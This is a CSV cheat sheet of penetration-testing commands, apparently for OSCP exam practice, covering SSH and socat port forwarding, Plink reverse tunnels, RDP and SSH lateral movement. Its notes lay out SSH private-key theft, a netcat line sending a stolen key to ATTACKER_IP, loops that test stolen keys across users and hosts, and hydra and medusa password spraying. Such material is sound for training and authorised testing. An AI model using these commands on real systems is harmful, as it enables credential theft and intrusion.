"id","name","category","command","description","subcategory","notes","oscp_relevance"
"ssh-remote-dynamic-port-forward","SSH Remote Dynamic Port Forward (Reverse SOCKS)","pivoting","ssh -N -R <SOCKS_PORT> <SSH_USER>@<SSH_SERVER>","Create SSH remote dynamic port forward - reverse SOCKS proxy on SSH server for firewall bypass with multi-destination flexibility","ssh_tunneling","Remote dynamic forward combines reverse tunnel (firewall bypass) with SOCKS proxy (multi-destination flexibility).

Requires OpenSSH ≥7.6 on compromised client (Windows 1803+ has version 8.1+, most modern Linux has ≥7.6).

Syntax difference:
Normal remote forward includes destination (-R port:host:hostport), remote dynamic only has port (-R port).

Critical OSCP technique for enumeration through firewalled pivot points.","high"
"socat-port-forward","Socat TCP Port Forward","pivoting","socat -ddd TCP-LISTEN:<LOCAL_PORT>,fork TCP:<DEST_IP>:<DEST_PORT>","Create simple TCP port forward using Socat - no encryption, no authentication, single command relay","port_forwarding","Socat simpler than SSH tunneling but lacks encryption and authentication.

Useful for quick port forwards when security less critical or SSH unavailable.

Limitation:
One listening port per Socat process - need separate process for each port forward.

Common OSCP use case:
Quick access to internal database when Socat already installed on compromised host.

For production:
Use SSH tunneling for encrypted, authenticated forwarding.","medium"
"plink-remote-forward","Plink Remote Port Forward","pivoting","plink.exe -ssh -l <SSH_USER> -pw <SSH_PASSWORD> -R <REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_HOST>","Create reverse SSH tunnel using Plink (PuTTY CLI) on Windows - bypass firewall by initiating connection from compromised host","ssh-tunneling","Plink is PuTTY's command-line interface - ideal for Windows hosts without OpenSSH.

Unlike OpenSSH's ssh.exe, Plink supports password on command line with -pw (bad OPSEC but useful for scripts).

Critical OSCP technique:
Reverse tunnel allows pivot through firewall blocking inbound connections.

Alternative authentication:
Use -i <keyfile.ppk> for Putty private key (convert from OpenSSH with puttygen).

Production:
Use SSH keys, not passwords.

Time estimate:
3-5 minutes including file transfer.","high"
"xfreerdp-connect","xFreeRDP Connection","pivoting","xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard","Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass","remote-access","xFreeRDP is the standard Linux RDP client for OSCP.

Clipboard sharing critical for file transfer when no other options available.

Drive sharing with +drive:share,/path mounts local directory as \\tsclient\share in Windows - alternative to SMB/HTTP servers.

Common OSCP pattern:
RDP into dual-homed Windows host, then set up SSH/Plink tunnel to access internal network.

Time estimate:
1-2 minutes for connection.","high"
"ssh-version","SSH Version Check","pivoting","ssh -V","Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires ≥7.6)","ssh-tunneling","Critical check before using ssh-remote-dynamic-port-forward.

OpenSSH 7.6+ required for reverse SOCKS proxy.

Windows 1803+ includes OpenSSH 8.1+.

Most modern Linux has 7.6+.","medium"
"ssh-debug-verbose","SSH Verbose Debugging","pivoting","ssh -vvv <SSH_USER>@<SSH_HOST>","SSH connection with maximum verbosity - troubleshoot authentication, key exchange, and tunnel issues","ssh-tunneling","Use when SSH tunnels fail silently.

Verbose output shows:
key exchange, authentication attempts, tunnel establishment, connection forwarding.

Critical for diagnosing 'port forward works but connection hangs' scenarios.","medium"
"sshuttle-vpn","SSHuttle VPN over SSH","pivoting","sshuttle -r <SSH_USER>@<SSH_HOST> <SUBNET>/<CIDR> --dns","Create transparent VPN over SSH - route entire subnets through pivot without proxychains","ssh-tunneling","SSHuttle creates transparent proxy - tools work normally without proxychains prefix.

Advantage over SOCKS:
UDP support, transparent to applications, easier syntax.

Disadvantage:
Requires Python on pivot, modifies local routing table (iptables), less stealthy than SOCKS.

OSCP use case:
When proxychains causes issues with specific tools (e.g., Metasploit, Responder).

Time estimate:
2-3 minutes for setup, ~30 seconds per subnet route.","medium"
"ssh-connect-password","SSH Connect with Password","pivoting","ssh <USER>@<TARGET>","Connect to SSH server using password authentication for lateral movement or initial access","ssh","CRITICAL OSCP LATERAL MOVEMENT: Password reuse across services is common.

SSH password authentication workflow:
1. Enumerate SSH service: nmap -p 22 <TARGET>
2. Identify valid users: From /etc/passwd, web app, LDAP
3. Test credentials: From database dumps, config files, previous shells
4. Connect: ssh <USER>@<TARGET>
5. Upgrade shell: Usually not needed (SSH provides full PTY)
6. Enumerate: sudo -l, id, groups

Common OSCP scenarios:
(1) Database credentials work on SSH
    → Dump MySQL user table, test passwords

(2) Web application credentials work on SSH
    → Admin panel passwords often reused

(3) Credentials found in config files
    → .env, config.php, database.yml

(4) Default credentials
    → root:root, admin:admin, user:user

Manual verification before SSH:
# Verify SSH service running
nmap -p 22 -sV <TARGET>

# Check SSH banner for version
nc <TARGET> 22

# Verify user exists (if you have shell)
grep <USER> /etc/passwd

SSH flags for OSCP:
-p <PORT>  - Alternate SSH port
-v         - Verbose (debug connection issues)
-4         - Force IPv4 (avoid IPv6 issues)
-o StrictHostKeyChecking=no - Bypass host key verification (exam machines)
-o UserKnownHostsFile=/dev/null - Don't save host key

Password reuse attack vectors:
(1) Web app → SSH (most common)
(2) Database → SSH
(3) FTP → SSH
(4) SMB → SSH (Windows/Linux hybrid networks)
(5) User → Root (su with found password)

Alternatives:
sshpass -p 'password123' ssh user@target - Non-interactive password entry
hydra -l user -P passwords.txt ssh://target - Password spraying
medusa -h target -u user -P passwords.txt -M ssh - Alternative brute force

OSCP exam tip: ALWAYS test found credentials on SSH immediately. Document all credential pairs in credentials.txt. Common pattern: Web admin password = SSH user password.

Time estimate: 30 seconds (connection) + 0-5 minutes (troubleshooting)","high"
"ssh-key-authentication","SSH Connect with Private Key","pivoting","chmod 600 <KEY_FILE> && ssh -i <KEY_FILE> <USER>@<TARGET>","Connect to SSH server using private key authentication after extracting id_rsa from target system","ssh","HIGH-VALUE OSCP TECHNIQUE: SSH key theft for lateral movement.

SSH key authentication workflow:
1. Find private key on compromised system
   → Common locations: ~/.ssh/id_rsa, /home/*/.ssh/id_rsa, /root/.ssh/id_rsa

2. Extract key to attacker machine
   → Method 1: cat id_rsa (copy/paste)
   → Method 2: Base64 encode: base64 -w0 id_rsa (copy), base64 -d > id_rsa (paste)
   → Method 3: HTTP server: python3 -m http.server 8000, wget from attacker

3. Fix key format if needed (see ssh-key-format)
   → Check format: head -1 id_rsa
   → If ""BEGIN OPENSSH PRIVATE KEY"": Good, use directly
   → If ""BEGIN RSA PRIVATE KEY"": Good, use directly
   → If encrypted: Crack with ssh2john

4. Set correct permissions (CRITICAL)
   → chmod 600 id_rsa
   → SSH will refuse to use key with wrong permissions

5. Connect with key
   → ssh -i id_rsa <USER>@<TARGET>
   → Username often matches key owner: ls -l /home/*/.ssh/id_rsa

6. Enumerate privileges
   → sudo -l, id, groups

Common OSCP scenarios:
(1) Key found in web directory
    → /var/www/.ssh/id_rsa (web user)

(2) Key found in user home
    → /home/admin/.ssh/id_rsa (admin user)

(3) Key found in backup
    → /opt/backups/id_rsa, /tmp/id_rsa.bak

(4) Key in Git repository
    → .git/config, .git/ssh/, accidentally committed

(5) Multiple keys for different users
    → Test each key against all known users

Key permissions explained:
600 (rw-------) - Owner read/write only (REQUIRED for private keys)
644 (rw-r--r--) - Too permissive, SSH will reject
700 (rwx------) - Directory permissions for .ssh/

Finding SSH keys on target:
# Find all private keys
find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null

# Find all .ssh directories
find / -type d -name '.ssh' 2>/dev/null

# Check current user's keys
ls -la ~/.ssh/

# Check all users' keys (if readable)
find /home -name 'id_*' 2>/dev/null

Testing key against multiple users:
for user in root admin user1 user2; do
  echo ""Testing $user""
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@target && echo ""SUCCESS: $user"" && break
done

Advanced flags:
-o BatchMode=yes - Don't prompt for passphrase (fail if encrypted)
-o StrictHostKeyChecking=no - Bypass host key verification
-o UserKnownHostsFile=/dev/null - Don't save host key
-v - Verbose (debug authentication issues)

OSCP exam tip: ALWAYS check ~/.ssh/id_rsa immediately after gaining shell. If found, extract immediately. Test against all known users. Document in breakthrough.md if successful.

Time estimate: 1-2 minutes (key extraction) + 30 seconds (connection)","high"
"extract-ssh-key","Extract SSH Private Key","pivoting","cat ~/.ssh/id_rsa","Extract SSH private key from compromised system for lateral movement via key authentication","ssh","CRITICAL OSCP TECHNIQUE: SSH key theft enables passwordless lateral movement.

SSH private key locations (in order of likelihood):
(1) ~/.ssh/id_rsa - Current user's default RSA key
(2) ~/.ssh/id_ecdsa - Current user's ECDSA key (newer)
(3) ~/.ssh/id_ed25519 - Current user's Ed25519 key (newest)
(4) /home/<USER>/.ssh/id_rsa - Other users' keys (if readable)
(5) /root/.ssh/id_rsa - Root user's key (requires root access)
(6) /var/www/.ssh/id_rsa - Web user's key
(7) Backup locations: /tmp/id_rsa, /opt/backups/, .git/

Key extraction workflow:
1. Enumerate users: cat /etc/passwd | grep /bin/bash
2. Check current user's key: ls -la ~/.ssh/
3. Extract current user's key (THIS COMMAND)
4. Search for other users' keys:
   find /home -name 'id_rsa' -readable 2>/dev/null
5. Transfer key to attacker machine
6. Format key if needed (ssh-key-format)
7. Set permissions: chmod 600 id_rsa
8. Test key: ssh -i id_rsa <USER>@<TARGET>

Key format identification:
# RSA private key (older format, widely compatible)
-----BEGIN RSA PRIVATE KEY-----

# OpenSSH private key (newer format, OpenSSH 7.8+)
-----BEGIN OPENSSH PRIVATE KEY-----

# Encrypted private key (requires passphrase)
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...

Key transfer methods:
Method 1: Copy/paste (small keys)
- Cat key on target, copy output
- Paste into file on attacker: nano id_rsa
- Set permissions: chmod 600 id_rsa

Method 2: Base64 encoding (cleaner, no formatting issues)
- On target: base64 -w0 ~/.ssh/id_rsa
- Copy base64 string
- On attacker: echo '<BASE64>' | base64 -d > id_rsa
- Set permissions: chmod 600 id_rsa

Method 3: HTTP server (large keys, multiple files)
- On target: cd ~/.ssh && python3 -m http.server 8000
- On attacker: wget http://target:8000/id_rsa
- Set permissions: chmod 600 id_rsa

Method 4: Netcat transfer
- On attacker: nc -lvnp 9001 > id_rsa
- On target: nc ATTACKER_IP 9001 < ~/.ssh/id_rsa
- Set permissions: chmod 600 id_rsa

Common OSCP scenarios:
(1) Web user has SSH key for database server
    → Pivot from web shell to database server

(2) User has SSH key for internal network
    → Lateral movement to internal machines

(3) Backup script contains SSH keys
    → /opt/backup.sh, /usr/local/bin/sync.sh

(4) Git repository with committed keys (mistake)
    → git log --all --full-history -- '*.ssh/*'

(5) Keys in world-readable locations (misconfiguration)
    → find / -name 'id_*' -perm -004 2>/dev/null

Public key verification:
Every private key has corresponding public key (.pub)
To verify key ownership:
1. Extract public key from private: ssh-keygen -y -f id_rsa
2. Compare with ~/.ssh/id_rsa.pub on target
3. Check authorized_keys: cat ~/.ssh/authorized_keys (shows where key grants access)

Testing extracted key:
# Test key against user it was found under
ssh -i id_rsa <USER>@<TARGET>

# Test key against all enumerated users
for user in $(cat users.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 $user@<TARGET> 2>/dev/null && echo ""SUCCESS: $user""
done

# Test key against multiple targets (key reuse)
for ip in $(cat targets.txt); do
  ssh -i id_rsa -o BatchMode=yes -o ConnectTimeout=5 <USER>@$ip 2>/dev/null && echo ""SUCCESS: $ip""
done

Advanced enumeration:
# Find all SSH-related files
find ~/.ssh -type f 2>/dev/null

# Check SSH config for key locations
cat ~/.ssh/config 2>/dev/null | grep IdentityFile

# Search bash history for SSH commands
cat ~/.bash_history | grep 'ssh\|scp\|id_rsa'

OSCP exam tip: Check for SSH keys IMMEDIATELY after shell upgrade. Priority locations: current user's ~/.ssh/, then /home/*/.ssh/. If found, extract and test against all known IPs/users. Document in breakthrough.md.

Time estimate: 1-2 minutes (search + extraction) + 30 seconds per transfer method","high"
